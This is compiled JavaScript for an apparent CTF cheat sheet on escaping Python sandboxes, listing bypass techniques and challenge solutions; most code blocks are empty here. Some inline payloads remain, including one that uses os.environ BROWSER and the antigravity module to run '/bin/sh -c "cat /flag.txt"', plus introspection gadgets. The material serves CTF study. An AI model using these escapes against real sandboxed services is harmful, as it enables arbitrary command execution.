1linepyjail"),nl=u(),Ss=p("ul"),Eo=p("li"),ho=p("code"),wi=k("jail.py"),al=u(),Bs=p("pre"),pl=u(),qs=p("ul"),xo=p("li"),Co=p("code"),vi=k("solve.py"),tl=u(),zs=p("pre"),ol=u(),Ws=p("h3"),Hp=p("a"),Ei=k("idekCTF 2024: crator"),el=u(),Ys=p("ul"),Lo=p("li"),To=p("code"),hi=k("sandbox.py"),cl=u(),Gs=p("pre"),ll=u(),Vs=p("ul"),Ao=p("li"),Oo=p("code"),xi=k("chall.py"),ul=u(),$s=p("pre"),rl=u(),Js=p("ul"),Fo=p("li"),Ro=p("code"),Ci=k("solve.py"),kl=u(),Ks=p("pre"),il=u(),Zs=p("h3"),Up=p("a"),Li=k("UIUCTF 2024: ASTea"),_l=u(),Xs=p("ul"),Io=p("li"),Do=p("code"),Ti=k("chall.py"),dl=u(),Qs=p("pre"),fl=u(),sn=p("ul"),jo=p("li"),No=p("code"),Ai=k("solve.py"),ml=u(),nn=p("pre"),bl=u(),an=p("h3"),Mp=p("a"),Oi=k("vsCTF 2024: llama-jail-revenge"),yl=u(),pn=p("ul"),Po=p("li"),Ho=p("code"),Fi=k("chall.py"),gl=u(),tn=p("pre"),wl=u(),on=p("ul"),Uo=p("li"),Mo=p("code"),Ri=k("exec_utils.py"),vl=u(),en=p("pre"),El=u(),cn=p("ul"),So=p("li"),Bo=p("code"),Ii=k("solve.py"),hl=u(),ln=p("pre"),xl=u(),un=p("h3"),Sp=p("a"),Di=k("UofTCTF 2024: Zero"),Cl=u(),rn=p("ul"),qo=p("li"),zo=p("code"),ji=k("chal.py"),Ll=u(),kn=p("pre"),Tl=u(),_n=p("ul"),Wo=p("li"),Yo=p("code"),Ni=k("solve.py"),Al=u(),dn=p("pre"),Ol=u(),fn=p("h3"),Bp=p("a"),Pi=k("GlacierCTF 2023: Avatar"),Fl=u(),mn=p("ul"),Go=p("li"),Vo=p("code"),Hi=k("server.py"),Rl=u(),bn=p("pre"),Il=u(),yn=p("ul"),$o=p("li"),Jo=p("code"),Ui=k("solve.py"),Dl=u(),gn=p("pre"),jl=u(),wn=p("h3"),qp=p("a"),Mi=k("TFC CTF 2023: My Third Calculator"),Nl=u(),vn=p("ul"),Ko=p("li"),Zo=p("code"),Si=k("server.py"),Pl=u(),En=p("pre"),Hl=u(),hn=p("ul"),Xo=p("li"),Qo=p("code"),Bi=k("solve.py"),Ul=u(),xn=p("pre"),Ml=u(),Cn=p("h3"),zp=p("a"),qi=k("Equinor CTF 2023: Dis is it!"),Sl=u(),Ln=p("ul"),se=p("li"),ne=p("code"),zi=k("main.py"),Bl=u(),Tn=p("pre"),ql=u(),An=p("ul"),ae=p("li"),pe=p("code"),Wi=k("solve.py"),zl=u(),On=p("pre"),Wl=u(),Fn=p("h3"),Wp=p("a"),Yi=k("37C3 Potluck CTF: tacocat"),Yl=u(),Rn=p("ul"),te=p("li"),oe=p("code"),Gi=k("main.py"),Gl=u(),In=p("pre"),Vl=u(),Dn=p("ul"),ee=p("li"),ce=p("code"),Vi=k("solve.py"),$l=u(),jn=p("pre"),Jl=u(),Nn=p("h3"),Yp=p("a"),$i=k("Internet Festival 2023 CTF Finals: prison"),Kl=u(),Pn=p("ul"),le=p("li"),ue=p("code"),Ji=k("prison.py"),Zl=u(),Hn=p("pre"),Xl=u(),Un=p("ul"),re=p("li"),ke=p("code"),Ki=k("solve.py"),Ql=u(),Mn=p("pre"),su=u(),Sn=p("h3"),Gp=p("a"),Zi=k("WACON 2023 Prequal: ScavengerHunt"),nu=u(),Bn=p("ul"),ie=p("li"),_e=p("code"),Xi=k("prob.py"),au=u(),qn=p("pre"),pu=u(),zn=p("ul"),de=p("li"),fe=p("code"),Qi=k("secret.py"),tu=u(),Wn=p("pre"),ou=u(),Yn=p("ul"),me=p("li"),be=p("code"),s_=k("solve.py"),eu=u(),Gn=p("pre"),cu=u(),Vn=p("h3"),Vp=p("a"),n_=k("CrewCTF 2023: starship-1"),lu=u(),$n=p("ul"),ye=p("li"),ge=p("code"),a_=k("sandbox.py"),uu=u(),Jn=p("pre"),ru=u(),Kn=p("ul"),we=p("li"),ve=p("code"),p_=k("solve.py"),ku=u(),Zn=p("pre"),iu=u(),Xn=p("h3"),$p=p("a"),t_=k("CrewCTF 2023: starship"),_u=u(),Qn=p("ul"),Ee=p("li"),he=p("code"),o_=k("server.py"),du=u(),sa=p("pre"),fu=u(),na=p("ul"),xe=p("li"),Ce=p("code"),e_=k("solve.py"),mu=u(),aa=p("pre"),bu=u(),pa=p("h3"),Jp=p("a"),c_=k("CrewCTF 2023: setjail"),yu=u(),ta=p("ul"),Le=p("li"),Te=p("code"),l_=k("main.py"),gu=u(),oa=p("pre"),wu=u(),ea=p("ul"),Ae=p("li"),Oe=p("code"),u_=k("solve.py"),vu=u(),ca=p("pre"),Eu=u(),la=p("h3"),Kp=p("a"),r_=k("CrewCTF 2023: jailpie"),hu=u(),ua=p("ul"),Fe=p("li"),Re=p("code"),k_=k("server.py"),xu=u(),ra=p("pre"),Cu=u(),ka=p("ul"),Ie=p("li"),De=p("code"),i_=k("solve.py"),Lu=u(),ia=p("pre"),Tu=u(),_a=p("h3"),Zp=p("a"),__=k("SEETF 2023: Another PyJail"),Au=u(),da=p("ul"),je=p("li"),Ne=p("code"),d_=k("server.py"),Ou=u(),fa=p("pre"),Fu=u(),ma=p("ul"),Pe=p("li"),He=p("code"),f_=k("solve.py"),Ru=u(),ba=p("pre"),Iu=u(),ya=p("h3"),Xp=p("a"),m_=k("BYUCTF 2023: Builtins 2"),Du=u(),ga=p("ul"),Ue=p("li"),Me=p("code"),b_=k("b2.py"),ju=u(),wa=p("pre"),Nu=u(),va=p("ul"),Se=p("li"),Be=p("code"),y_=k("solve.py"),Pu=u(),Ea=p("pre"),Hu=u(),ha=p("h3"),Qp=p("a"),g_=k("BYUCTF 2023: a-z0-9"),Uu=u(),xa=p("ul"),qe=p("li"),ze=p("code"),w_=k("a-z0-9.py"),Mu=u(),Ca=p("pre"),Su=u(),La=p("ul"),We=p("li"),Ye=p("code"),v_=k("solve.py"),Bu=u(),Ta=p("pre"),qu=u(),Aa=p("h3"),st=p("a"),E_=k("BYUCTF 2023: Leet 2"),zu=u(),Oa=p("ul"),Ge=p("li"),Ve=p("code"),h_=k("leet2.py"),Wu=u(),Fa=p("pre"),Yu=u(),Ra=p("ul"),$e=p("li"),Je=p("code"),x_=k("solve.py"),Gu=u(),Ia=p("pre"),Vu=u(),Da=p("h3"),nt=p("a"),C_=k("BYUCTF 2023: abcdefghijklm"),$u=u(),ja=p("ul"),Ke=p("li"),Ze=p("code"),L_=k("abcdefghijklm.py"),Ju=u(),Na=p("pre"),Ku=u(),Pa=p("ul"),Xe=p("li"),Qe=p("code"),T_=k("solve.py"),Zu=u(),Ha=p("pre"),Xu=u(),Ua=p("h3"),at=p("a"),A_=k("BYUCTF 2023: nopqrstuvwxyz"),Qu=u(),Ma=p("ul"),sc=p("li"),nc=p("code"),O_=k("nopqrstuvwxyz.py"),sr=u(),Sa=p("pre"),nr=u(),Ba=p("ul"),ac=p("li"),pc=p("code"),F_=k("solve.py"),ar=u(),qa=p("pre"),pr=u(),za=p("h2"),pt=p("a"),R_=k("References"),tr=u(),h=p("ul"),tc=p("li"),M=p("a"),I_=k("https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),D_=u(),oc=p("li"),S=p("a"),j_=k("https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),N_=u(),ec=p("li"),B=p("a"),P_=k("https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),this.h()},l(s){d=t(s,"BLOCKQUOTE",{});var e=o(d);v=t(e,"P",{});var nd=o(v);O=i(nd,"Notice: This document will be continuously updated."),nd.forEach(n),e.forEach(n),q=r(s),_=t(s,"H2",{id:!0});var ad=o(_);m=t(ad,"A",{href:!0});var pd=o(m);Ya=i(pd,"Sinks"),pd.forEach(n),ad.forEach(n),cc=r(s),$=t(s,"H3",{id:!0});var td=o($);Ga=t(td,"A",{href:!0});var od=o(Ga);ir=i(od,"retrieving builtins"),od.forEach(n),td.forEach(n),lc=r(s),J=t(s,"PRE",{class:!0});var n1=o(J);n1.forEach(n),uc=r(s),K=t(s,"H3",{id:!0});var ed=o(K);Va=t(ed,"A",{href:!0});var cd=o(Va);_r=i(cd,"good to know built-in functions and methods"),cd.forEach(n),ed.forEach(n),rc=r(s),Z=t(s,"PRE",{class:!0});var a1=o(Z);a1.forEach(n),kc=r(s),X=t(s,"H3",{id:!0});var ld=o(X);$a=t(ld,"A",{href:!0});var ud=o($a);dr=i(ud,"subclasses"),ud.forEach(n),ld.forEach(n),ic=r(s),Q=t(s,"PRE",{class:!0});var p1=o(Q);p1.forEach(n),_c=r(s),ss=t(s,"H3",{id:!0});var rd=o(ss);Ja=t(rd,"A",{href:!0});var kd=o(Ja);fr=i(kd,"popular modules"),kd.forEach(n),rd.forEach(n),dc=r(s),ns=t(s,"PRE",{class:!0});var t1=o(ns);t1.forEach(n),fc=r(s),as=t(s,"H2",{id:!0});var id=o(as);Ka=t(id,"A",{href:!0});var _d=o(Ka);mr=i(_d,"Bypasses and payloads"),_d.forEach(n),id.forEach(n),mc=r(s),ps=t(s,"H3",{id:!0});var dd=o(ps);Za=t(dd,"A",{href:!0});var fd=o(Za);br=i(fd,"decorators"),fd.forEach(n),dd.forEach(n),bc=r(s),ts=t(s,"PRE",{class:!0});var o1=o(ts);o1.forEach(n),yc=r(s),os=t(s,"H3",{id:!0});var md=o(os);Xa=t(md,"A",{href:!0});var bd=o(Xa);yr=i(bd,"unicode bypass"),bd.forEach(n),md.forEach(n),gc=r(s),es=t(s,"PRE",{class:!0});var e1=o(es);e1.forEach(n),wc=r(s),cs=t(s,"H3",{id:!0});var yd=o(cs);Qa=t(yd,"A",{href:!0});var gd=o(Qa);gr=i(gd,"audithook bypass"),gd.forEach(n),yd.forEach(n),vc=r(s),ls=t(s,"PRE",{class:!0});var c1=o(ls);c1.forEach(n),Ec=r(s),us=t(s,"PRE",{class:!0});var l1=o(us);l1.forEach(n),hc=r(s),rs=t(s,"H3",{id:!0});var wd=o(rs);sp=t(wd,"A",{href:!0});var vd=o(sp);wr=i(vd,"assigning attributes and variables"),vd.forEach(n),wd.forEach(n),xc=r(s),ks=t(s,"PRE",{class:!0});var u1=o(ks);u1.forEach(n),Cc=r(s),is=t(s,"PRE",{class:!0});var r1=o(is);r1.forEach(n),Lc=r(s),_s=t(s,"H3",{id:!0});var Ed=o(_s);np=t(Ed,"A",{href:!0});var hd=o(np);vr=i(hd,"getting attributes"),hd.forEach(n),Ed.forEach(n),Tc=r(s),ds=t(s,"PRE",{class:!0});var k1=o(ds);k1.forEach(n),Ac=r(s),fs=t(s,"PRE",{class:!0});var i1=o(fs);i1.forEach(n),Oc=r(s),ms=t(s,"H3",{id:!0});var xd=o(ms);ap=t(xd,"A",{href:!0});var Cd=o(ap);Er=i(Cd,"running functions and methods without parenthesis"),Cd.forEach(n),xd.forEach(n),Fc=r(s),bs=t(s,"PRE",{class:!0});var _1=o(bs);_1.forEach(n),Rc=r(s),ys=t(s,"PRE",{class:!0});var d1=o(ys);d1.forEach(n),Ic=r(s),gs=t(s,"H3",{id:!0});var Ld=o(gs);pp=t(Ld,"A",{href:!0});var Td=o(pp);hr=i(Td,"deleting variables"),Td.forEach(n),Ld.forEach(n),Dc=r(s),ws=t(s,"PRE",{class:!0});var f1=o(ws);f1.forEach(n),jc=r(s),vs=t(s,"H2",{id:!0});var Ad=o(vs);tp=t(Ad,"A",{href:!0});var Od=o(tp);xr=i(Od,"General stuff"),Od.forEach(n),Ad.forEach(n),Nc=r(s),Es=t(s,"H3",{id:!0});var Fd=o(Es);op=t(Fd,"A",{href:!0});var Rd=o(op);Cr=i(Rd,"environment variables"),Rd.forEach(n),Fd.forEach(n),Pc=r(s),F=t(s,"UL",{class:!0});var or=o(F);ut=t(or,"LI",{});var Id=o(ut);R=t(Id,"A",{href:!0,rel:!0,class:!0,target:!0});var Dd=o(R);Lr=i(Dd,"https://www.elttam.com/blog/env/#python"),Dd.forEach(n),Id.forEach(n),Tr=r(or),b=t(or,"LI",{});var x=o(b);rt=t(x,"CODE",{});var jd=o(rt);Ar=i(jd,"PYTHONINSPECT"),jd.forEach(n),Or=i(x,", "),kt=t(x,"CODE",{});var Nd=o(kt);Fr=i(Nd,"PYTHONHOME"),Nd.forEach(n),Rr=i(x,", "),it=t(x,"CODE",{});var Pd=o(it);Ir=i(Pd,"PYTHONPATH"),Pd.forEach(n),Dr=i(x,", "),_t=t(x,"CODE",{});var Hd=o(_t);jr=i(Hd,"PYTHONWARNINGS"),Hd.forEach(n),Nr=i(x,", "),dt=t(x,"CODE",{});var Ud=o(dt);Pr=i(Ud,"BROWSER"),Ud.forEach(n),z=t(x,"UL",{class:!0});var er=o(z);ft=t(er,"LI",{});var Md=o(ft);mt=t(Md,"CODE",{});var Sd=o(mt);Hr=i(Sd,'help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")'),Sd.forEach(n),Md.forEach(n),Ur=r(er),hs=t(er,"LI",{});var cr=o(hs);bt=t(cr,"CODE",{});var Bd=o(bt);Mr=i(Bd,`help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))`),Bd.forEach(n),Sr=i(cr," - ref: "),I=t(cr,"A",{href:!0,rel:!0,class:!0,target:!0});var qd=o(I);Br=i(qd,"https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),qd.forEach(n),cr.forEach(n),er.forEach(n),x.forEach(n),or.forEach(n),Hc=r(s),xs=t(s,"H3",{id:!0});var zd=o(xs);ep=t(zd,"A",{href:!0});var Wd=o(ep);qr=i(Wd,"magic methods"),Wd.forEach(n),zd.forEach(n),Uc=r(s),Cs=t(s,"UL",{class:!0});var Yd=o(Cs);yt=t(Yd,"LI",{});var Gd=o(yt);D=t(Gd,"A",{href:!0,rel:!0,class:!0,target:!0});var Vd=o(D);zr=i(Vd,"https://rszalski.github.io/magicmethods/#appendix1"),Vd.forEach(n),Gd.forEach(n),Yd.forEach(n),Mc=r(s),Ls=t(s,"H3",{id:!0});var $d=o(Ls);cp=t($d,"A",{href:!0});var Jd=o(cp);Wr=i(Jd,"help"),Jd.forEach(n),$d.forEach(n),Sc=r(s),w=t(s,"UL",{class:!0});var G=o(w);gt=t(G,"LI",{});var Kd=o(gt);Yr=i(Kd,"use of pager (ie. less) to escape sandbox"),Kd.forEach(n),Gr=r(G),lp=t(G,"LI",{});var H_=o(lp);Vr=i(H_,"list modules by entering "),wt=t(H_,"CODE",{});var Zd=o(wt);$r=i(Zd,"modules"),Zd.forEach(n),H_.forEach(n),Jr=r(G),up=t(G,"LI",{});var U_=o(up);Kr=i(U_,"load modules by entering module names:"),y=t(U_,"UL",{class:!0});var A=o(y);rp=t(A,"LI",{});var M_=o(rp);vt=t(M_,"CODE",{});var Xd=o(vt);Zr=i(Xd,"__main__"),Xd.forEach(n),Xr=i(M_," - should already be loaded, help page shown if so"),M_.forEach(n),Qr=r(A),kp=t(A,"LI",{});var S_=o(kp);Et=t(S_,"CODE",{});var Qd=o(Et);sk=i(Qd,"pdb"),Qd.forEach(n),nk=i(S_," - similar to importing pdb"),S_.forEach(n),ak=r(A),ip=t(A,"LI",{});var B_=o(ip);ht=t(B_,"CODE",{});var sf=o(ht);pk=i(sf,"antigravity"),sf.forEach(n),tk=i(B_," - similar to importing antigravity"),B_.forEach(n),ok=r(A),E=t(A,"LI",{});var V=o(E);xt=t(V,"CODE",{});var nf=o(xt);ek=i(nf,"PROGRAM_NAME"),nf.forEach(n),ck=i(V," / "),Ct=t(V,"CODE",{});var af=o(Ct);lk=i(af,"jail"),af.forEach(n),uk=i(V," / "),Lt=t(V,"CODE",{});var pf=o(Lt);rk=i(pf,"app"),pf.forEach(n),kk=i(V," - similar to importing and rerunning program if not wrapped in "),Tt=t(V,"CODE",{});var tf=o(Tt);ik=i(tf,'if __name__ == "__main__":'),tf.forEach(n),V.forEach(n),_k=r(A),_p=t(A,"LI",{});var q_=o(_p);dk=i(q_,"note: loading modules would also add related imported classes to "),At=t(q_,"CODE",{});var of=o(At);fk=i(of,"object.__subclasses__()"),of.forEach(n),q_.forEach(n),A.forEach(n),U_.forEach(n),mk=r(G),dp=t(G,"LI",{});var z_=o(dp);bk=i(z_,"see "),j=t(z_,"A",{href:!0,rel:!0,class:!0,target:!0});var ef=o(j);yk=i(ef,"SECCON Beginners CTF 2022: hitchhike4b"),ef.forEach(n),z_.forEach(n),G.forEach(n),Bc=r(s),Ts=t(s,"PRE",{class:!0});var m1=o(Ts);m1.forEach(n),qc=r(s),As=t(s,"H3",{id:!0});var cf=o(As);fp=t(cf,"A",{href:!0});var lf=o(fp);gk=i(lf,"format string"),lf.forEach(n),cf.forEach(n),zc=r(s),Os=t(s,"PRE",{class:!0});var b1=o(Os);b1.forEach(n),Wc=r(s),Fs=t(s,"H3",{id:!0});var uf=o(Fs);mp=t(uf,"A",{href:!0});var rf=o(mp);wk=i(rf,"stable payloads"),rf.forEach(n),uf.forEach(n),Yc=r(s),Rs=t(s,"PRE",{class:!0});var y1=o(Rs);y1.forEach(n),Gc=r(s),Is=t(s,"H3",{id:!0});var kf=o(Is);bp=t(kf,"A",{href:!0});var _f=o(bp);vk=i(_f,"finding sinks from modules"),_f.forEach(n),kf.forEach(n),Vc=r(s),N=t(s,"UL",{class:!0});var lr=o(N);yp=t(lr,"LI",{});var W_=o(yp);P=t(W_,"A",{href:!0,rel:!0,class:!0,target:!0});var df=o(P);Ek=i(df,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),df.forEach(n),gp=t(W_,"UL",{class:!0});var ff=o(gp);Ot=t(ff,"LI",{});var mf=o(Ot);Ft=t(mf,"CODE",{});var bf=o(Ft);hk=i(bf,'__import__("ctypes")._aix.environ'),bf.forEach(n),mf.forEach(n),ff.forEach(n),W_.forEach(n),xk=r(lr),wp=t(lr,"LI",{});var Y_=o(wp);H=t(Y_,"A",{href:!0,rel:!0,class:!0,target:!0});var yf=o(H);Ck=i(yf,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),yf.forEach(n),vp=t(Y_,"UL",{class:!0});var gf=o(vp);Rt=t(gf,"LI",{});var wf=o(Rt);It=t(wf,"CODE",{});var vf=o(It);Lk=i(vf,'__import__("_aix_support").sys'),vf.forEach(n),wf.forEach(n),gf.forEach(n),Y_.forEach(n),lr.forEach(n),$c=r(s),Ds=t(s,"H3",{id:!0});var Ef=o(Ds);Ep=t(Ef,"A",{href:!0});var hf=o(Ep);Tk=i(hf,"generic classes / bullet points"),hf.forEach(n),Ef.forEach(n),Jc=r(s),f=t(s,"UL",{class:!0});var g=o(f);U=t(g,"LI",{});var tt=o(U);Dt=t(tt,"CODE",{});var xf=o(Dt);Ak=i(xf,'f"{65:c}"'),xf.forEach(n),Ok=i(tt," can format an int to char (equivalent to "),jt=t(tt,"CODE",{});var Cf=o(jt);Fk=i(Cf,'"%c" % 65 == chr(65) == "A"'),Cf.forEach(n),Rk=i(tt,")"),hp=t(tt,"UL",{class:!0});var Lf=o(hp);xp=t(Lf,"LI",{});var G_=o(xp);Nt=t(G_,"CODE",{});var Tf=o(Nt);Ik=i(Tf,'"".encode().fromhex("41").decode()'),Tf.forEach(n),Dk=i(G_," parses hex into string"),G_.forEach(n),Lf.forEach(n),tt.forEach(n),jk=r(g),Cp=t(g,"LI",{});var V_=o(Cp);Pt=t(V_,"CODE",{});var Af=o(Pt);Nk=i(Af,"type"),Af.forEach(n),W=t(V_,"UL",{class:!0});var ur=o(W);Ht=t(ur,"LI",{});var Of=o(Ht);Ut=t(Of,"CODE",{});var Ff=o(Ut);Pk=i(Ff,"[].__class__.__class__"),Ff.forEach(n),Of.forEach(n),Hk=r(ur),Mt=t(ur,"LI",{});var Rf=o(Mt);St=t(Rf,"CODE",{});var If=o(St);Uk=i(If,'"".__class__.__class__'),If.forEach(n),Rf.forEach(n),ur.forEach(n),V_.forEach(n),Mk=r(g),Lp=t(g,"LI",{});var $_=o(Lp);Bt=t($_,"CODE",{});var Df=o(Bt);Sk=i(Df,"object"),Df.forEach(n),C=t($_,"UL",{class:!0});var ot=o(C);qt=t(ot,"LI",{});var jf=o(qt);zt=t(jf,"CODE",{});var Nf=o(zt);Bk=i(Nf,"[].__class__.__mro__[1]"),Nf.forEach(n),jf.forEach(n),qk=r(ot),Wt=t(ot,"LI",{});var Pf=o(Wt);Yt=t(Pf,"CODE",{});var Hf=o(Yt);zk=i(Hf,"[].__class__.__bases__[0]"),Hf.forEach(n),Pf.forEach(n),Wk=r(ot),Gt=t(ot,"LI",{});var Uf=o(Gt);Vt=t(Uf,"CODE",{});var Mf=o(Vt);Yk=i(Mf,"[].__class__.__base__"),Mf.forEach(n),Uf.forEach(n),ot.forEach(n),$_.forEach(n),Gk=r(g),Tp=t(g,"LI",{});var J_=o(Tp);$t=t(J_,"CODE",{});var Sf=o($t);Vk=i(Sf,"str"),Sf.forEach(n),L=t(J_,"UL",{class:!0});var et=o(L);Jt=t(et,"LI",{});var Bf=o(Jt);Kt=t(Bf,"CODE",{});var qf=o(Kt);$k=i(qf,'"".__class__'),qf.forEach(n),Bf.forEach(n),Jk=r(et),Zt=t(et,"LI",{});var zf=o(Zt);Xt=t(zf,"CODE",{});var Wf=o(Xt);Kk=i(Wf,"[].__doc__.__class__"),Wf.forEach(n),zf.forEach(n),Zk=r(et),Qt=t(et,"LI",{});var Yf=o(Qt);so=t(Yf,"CODE",{});var Gf=o(so);Xk=i(Gf,"[].__class__.__module__.__class__"),Gf.forEach(n),Yf.forEach(n),et.forEach(n),J_.forEach(n),Qk=r(g),Ap=t(g,"LI",{});var K_=o(Ap);no=t(K_,"CODE",{});var Vf=o(no);si=i(Vf,"tuple"),Vf.forEach(n),Op=t(K_,"UL",{class:!0});var $f=o(Op);ao=t($f,"LI",{});var Jf=o(ao);po=t(Jf,"CODE",{});var Kf=o(po);ni=i(Kf,"[].__class__.__bases__.__class__"),Kf.forEach(n),Jf.forEach(n),$f.forEach(n),K_.forEach(n),ai=r(g),Fp=t(g,"LI",{});var Z_=o(Fp);to=t(Z_,"CODE",{});var Zf=o(to);pi=i(Zf,"dict"),Zf.forEach(n),T=t(Z_,"UL",{class:!0});var ct=o(T);oo=t(ct,"LI",{});var Xf=o(oo);eo=t(Xf,"CODE",{});var Qf=o(eo);ti=i(Qf,"{}.__class__"),Qf.forEach(n),Xf.forEach(n),oi=r(ct),co=t(ct,"LI",{});var sm=o(co);lo=t(sm,"CODE",{});var nm=o(lo);ei=i(nm,"obj.__dict__.__class__"),nm.forEach(n),sm.forEach(n),ci=r(ct),uo=t(ct,"LI",{});var am=o(uo);ro=t(am,"CODE",{});var pm=o(ro);li=i(pm,'"".__class__.__dict__.copy().__class__'),pm.forEach(n),am.forEach(n),ct.forEach(n),Z_.forEach(n),ui=r(g),js=t(g,"LI",{});var rr=o(js);ko=t(rr,"CODE",{});var tm=o(ko);ri=i(tm,"class instances"),tm.forEach(n),ki=i(rr,":"),Y=t(rr,"UL",{class:!0});var kr=o(Y);Rp=t(kr,"LI",{});var X_=o(Rp);io=t(X_,"CODE",{});var om=o(io);ii=i(om,"class cobj:..."),om.forEach(n),Ip=t(X_,"UL",{class:!0});var em=o(Ip);_o=t(em,"LI",{});var cm=o(_o);fo=t(cm,"CODE",{});var lm=o(fo);_i=i(lm,"obj = cobj()"),lm.forEach(n),cm.forEach(n),em.forEach(n),X_.forEach(n),di=r(kr),Dp=t(kr,"LI",{});var Q_=o(Dp);mo=t(Q_,"CODE",{});var um=o(mo);fi=i(um,'type("cobj", (object,), {})()'),um.forEach(n),jp=t(Q_,"UL",{class:!0});var rm=o(jp);bo=t(rm,"LI",{});var km=o(bo);yo=t(km,"CODE",{});var im=o(yo);mi=i(im,'[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()'),im.forEach(n),km.forEach(n),rm.forEach(n),Q_.forEach(n),kr.forEach(n),rr.forEach(n),g.forEach(n),Kc=r(s),Ns=t(s,"H2",{id:!0});var _m=o(Ns);Np=t(_m,"A",{href:!0});var dm=o(Np);bi=i(dm,"CTF"),dm.forEach(n),_m.forEach(n),Zc=r(s),Ps=t(s,"H3",{id:!0});var fm=o(Ps);go=t(fm,"A",{href:!0}),o(go).forEach(n),fm.forEach(n),Xc=r(s),Hs=t(s,"UL",{class:!0});var mm=o(Hs);wo=t(mm,"LI",{});var bm=o(wo);vo=t(bm,"CODE",{});var ym=o(vo);yi=i(ym,"jail.py"),ym.forEach(n),bm.forEach(n),mm.forEach(n),Qc=r(s),Us=t(s,"PRE",{class:!0});var g1=o(Us);g1.forEach(n),sl=r(s),Ms=t(s,"H3",{id:!0});var gm=o(Ms);Pp=t(gm,"A",{href:!0});var wm=o(Pp);gi=i(wm,"SECCON CTF 13: 1linepyjail"),wm.forEach(n),gm.forEach(n),nl=r(s),Ss=t(s,"UL",{class:!0});var vm=o(Ss);Eo=t(vm,"LI",{});var Em=o(Eo);ho=t(Em,"CODE",{});var hm=o(ho);wi=i(hm,"jail.py"),hm.forEach(n),Em.forEach(n),vm.forEach(n),al=r(s),Bs=t(s,"PRE",{class:!0});var w1=o(Bs);w1.forEach(n),pl=r(s),qs=t(s,"UL",{class:!0});var xm=o(qs);xo=t(xm,"LI",{});var Cm=o(xo);Co=t(Cm,"CODE",{});var Lm=o(Co);vi=i(Lm,"solve.py"),Lm.forEach(n),Cm.forEach(n),xm.forEach(n),tl=r(s),zs=t(s,"PRE",{class:!0});var v1=o(zs);v1.forEach(n),ol=r(s),Ws=t(s,"H3",{id:!0});var Tm=o(Ws);Hp=t(Tm,"A",{href:!0});var Am=o(Hp);Ei=i(Am,"idekCTF 2024: crator"),Am.forEach(n),Tm.forEach(n),el=r(s),Ys=t(s,"UL",{class:!0});var Om=o(Ys);Lo=t(Om,"LI",{});var Fm=o(Lo);To=t(Fm,"CODE",{});var Rm=o(To);hi=i(Rm,"sandbox.py"),Rm.forEach(n),Fm.forEach(n),Om.forEach(n),cl=r(s),Gs=t(s,"PRE",{class:!0});var E1=o(Gs);E1.forEach(n),ll=r(s),Vs=t(s,"UL",{class:!0});var Im=o(Vs);Ao=t(Im,"LI",{});var Dm=o(Ao);Oo=t(Dm,"CODE",{});var jm=o(Oo);xi=i(jm,"chall.py"),jm.forEach(n),Dm.forEach(n),Im.forEach(n),ul=r(s),$s=t(s,"PRE",{class:!0});var h1=o($s);h1.forEach(n),rl=r(s),Js=t(s,"UL",{class:!0});var Nm=o(Js);Fo=t(Nm,"LI",{});var Pm=o(Fo);Ro=t(Pm,"CODE",{});var Hm=o(Ro);Ci=i(Hm,"solve.py"),Hm.forEach(n),Pm.forEach(n),Nm.forEach(n),kl=r(s),Ks=t(s,"PRE",{class:!0});var x1=o(Ks);x1.forEach(n),il=r(s),Zs=t(s,"H3",{id:!0});var Um=o(Zs);Up=t(Um,"A",{href:!0});var Mm=o(Up);Li=i(Mm,"UIUCTF 2024: ASTea"),Mm.forEach(n),Um.forEach(n),_l=r(s),Xs=t(s,"UL",{class:!0});var Sm=o(Xs);Io=t(Sm,"LI",{});var Bm=o(Io);Do=t(Bm,"CODE",{});var qm=o(Do);Ti=i(qm,"chall.py"),qm.forEach(n),Bm.forEach(n),Sm.forEach(n),dl=r(s),Qs=t(s,"PRE",{class:!0});var C1=o(Qs);C1.forEach(n),fl=r(s),sn=t(s,"UL",{class:!0});var zm=o(sn);jo=t(zm,"LI",{});var Wm=o(jo);No=t(Wm,"CODE",{});var Ym=o(No);Ai=i(Ym,"solve.py"),Ym.forEach(n),Wm.forEach(n),zm.forEach(n),ml=r(s),nn=t(s,"PRE",{class:!0});var L1=o(nn);L1.forEach(n),bl=r(s),an=t(s,"H3",{id:!0});var Gm=o(an);Mp=t(Gm,"A",{href:!0});var Vm=o(Mp);Oi=i(Vm,"vsCTF 2024: llama-jail-revenge"),Vm.forEach(n),Gm.forEach(n),yl=r(s),pn=t(s,"UL",{class:!0});var $m=o(pn);Po=t($m,"LI",{});var Jm=o(Po);Ho=t(Jm,"CODE",{});var Km=o(Ho);Fi=i(Km,"chall.py"),Km.forEach(n),Jm.forEach(n),$m.forEach(n),gl=r(s),tn=t(s,"PRE",{class:!0});var T1=o(tn);T1.forEach(n),wl=r(s),on=t(s,"UL",{class:!0});var Zm=o(on);Uo=t(Zm,"LI",{});var Xm=o(Uo);Mo=t(Xm,"CODE",{});var Qm=o(Mo);Ri=i(Qm,"exec_utils.py"),Qm.forEach(n),Xm.forEach(n),Zm.forEach(n),vl=r(s),en=t(s,"PRE",{class:!0});var A1=o(en);A1.forEach(n),El=r(s),cn=t(s,"UL",{class:!0});var sb=o(cn);So=t(sb,"LI",{});var nb=o(So);Bo=t(nb,"CODE",{});var ab=o(Bo);Ii=i(ab,"solve.py"),ab.forEach(n),nb.forEach(n),sb.forEach(n),hl=r(s),ln=t(s,"PRE",{class:!0});var O1=o(ln);O1.forEach(n),xl=r(s),un=t(s,"H3",{id:!0});var pb=o(un);Sp=t(pb,"A",{href:!0});var tb=o(Sp);Di=i(tb,"UofTCTF 2024: Zero"),tb.forEach(n),pb.forEach(n),Cl=r(s),rn=t(s,"UL",{class:!0});var ob=o(rn);qo=t(ob,"LI",{});var eb=o(qo);zo=t(eb,"CODE",{});var 